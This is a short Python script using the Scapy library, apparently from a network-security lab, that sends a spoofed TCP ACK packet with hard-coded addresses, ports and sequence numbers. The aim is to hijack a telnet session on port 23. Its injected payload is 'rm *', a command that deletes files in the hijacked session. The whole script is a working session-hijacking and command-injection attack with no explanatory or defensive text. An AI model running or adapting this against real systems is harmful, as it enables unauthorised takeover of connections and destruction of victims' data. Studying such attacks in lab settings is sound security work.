#!/usr/bin/python
import sys
from scapy.all import *
print("Sending session hijacking packet ")
IPLayer = IP(src="10.0.2.13" , dst="10.0.2.14")
TCPLayer = TCP(sport=40996, dport=23,flags="A", seq=2558603540, ack=475862963)
Data = "\r rm *\n\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)

